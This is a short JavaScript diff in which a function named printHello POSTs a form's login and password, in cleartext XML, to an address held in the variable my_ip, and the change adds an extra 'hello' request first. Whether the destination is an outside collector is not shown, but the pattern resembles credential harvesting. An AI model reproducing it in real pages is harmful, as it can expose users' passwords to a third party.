@@ -10,6 +10,9 @@ function printHello() {
 	// send the login and pass as resquests
 	var req = new XMLHttpRequest();
 	req.open( "POST", my_ip, true); // false for synchronous request
+	req.send("<message>hello</message>");
+	var req = new XMLHttpRequest();
+	req.open( "POST", my_ip, true);
 	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
     password.value = "";
 }
